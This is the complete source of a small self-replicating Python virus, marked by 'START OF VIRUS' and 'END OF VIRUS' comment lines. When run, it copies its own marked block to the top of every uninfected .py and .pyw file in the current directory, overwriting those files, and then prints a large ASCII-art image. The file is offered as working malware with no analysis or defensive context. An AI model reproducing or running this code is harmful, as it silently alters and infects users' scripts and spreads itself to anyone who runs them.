### START OF VIRUS ###

import sys, glob
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### END OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

print("""                                                                      
     -NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN/-Md 
     -M                               `                          -Md  
     -M                   `:+syhdmmNNNmdhys+:`                   -Md  
     -M               .+ymMMMMMMMMMMMMMMMMMMMMmy+.               -Md  
     -M            -smMMMMMMMMMy+oosyhyhdNMMMMMMMMms-            -Md  
     -M          +dMMMMMMMMMMMMo     `.---/symMMMMMMMm/`.`       -Md  
     -M        +NMMMMMMMMMMMMMN-..-------`.```-dMMMMMMMN+.:.     -Md  
     -M      :mMMMMMMMdo/::::-:://:-------/:..sMMMMMMMMMMm:-+`   -Md  
     -M     oMMMMMMMMMMMNdyo/+  `.-/+-+--//:.:MMMMMMMMMMMMMo`s-  -Md  
     -M   `dMMMMMMMMMMMMMMMMd+:o::s.  :. ``o-.-ohNMMMMMMMMMMh`y/ -Md  
     -M  `dMMMMMMMMMMMMNhy/.-` +///  `/  - :o-:///oNMMMMMMMMMd`y+-Md  
     -M  hMMMMMMMMMMNs+`.`   `      -:``---+MmMmMMMMMMMMMMMMMMy`msMd  
     -M +MMMMMMMMMNo.-../-//:/-/-/:-/..o/:`hMmMMMMMMMMMMMMMMMMM/-MMd  
     -s`NMMMMMMMMd.::syhdssMNy+..-//--oo:--hMdMMMMMMMMMMMMMMMMMm hMd  
     --+MMMMMMMMNodNMMMMMNmMMMMN+-..-.+ .--/dMMMMMMMMMMMMMMMMMMM:/Md  
     . yMMMMMMMMMMMMMMMMMMMMMMMo      `+oshMMMMMMMMMMMMMMMMMMMMMo.Md  
     ` dMMMMMMMMMMMMMMMMMMMMMMMNNsy+.hodmNmMMMMMMMMMMMMMMMMMMMMMy Md  
       dMMMMMMMMMMMMMMMMMMMMMMMMMmMMmMMmdMNMMMMMMMMMMMMMMMMMMMMMy Md  
     . hMMMMdooooossdMMMhooooooooyMMdMdymMdoooohMMymMMMNydMMMMMMo.Md  
     -.oMMMMNydhmmmd:/MM:+hdddmmhNMMh-:dMM+:hmhNMM.yMN+-+NMMMMMM:/Md  
     -o.MMMMMMNmMMMMy`MM:omMNNMMmMMM:+hMMM+/mMNMMM.yMd`dmMMMMMMm dMd  
     -N`sMMMy///////:dMM:+hNNNMMdMMMd:/NMM+/mMMMMM.yMMy.hMMMMMM/:MMd  
     -M:`mMM+:MMMMMmNMMM:-+++++MmMMMMMo-MM+/MMMMMM.yMMMh.yMMMMy`mMMd  
     -M`/.NM+:MMMMMNMMMM:oMMMMNMMMMMMm/-NM+/MMMMMM.yMMNy.yMMMd`hMNMd  
     -M :/-NysMMMMMMMMMMs////////sMMo+dMMMssMMMMMM/dMm/sNMMMh`yMN/Md  
     -M  /o.dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdMMMMMMMMs`dMN--Md  
     -M   :y.oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm::NMm. -Md  
     -M    .h+.yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN+.yMMy`  -Md  
     -M      +d+-sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm+.sMMm:    -Md  
     -M       `omo-/hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs::yMMm+      -Md  
     -M         `+mdo-/sdMMMMMMMMMMMMMMMMMMMMMNho::sNMMh/        -Md  
     -M            -smNy+::+sydmNMMMMMMNmhyo/:/odMMMd+.          -Md    
     -M:::::::::::::::+hNMMNdys++//////+oshdNMMMMmy/::::::::::::.-Md
     -NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN/-Md    """)

### END OF VIRUS ###
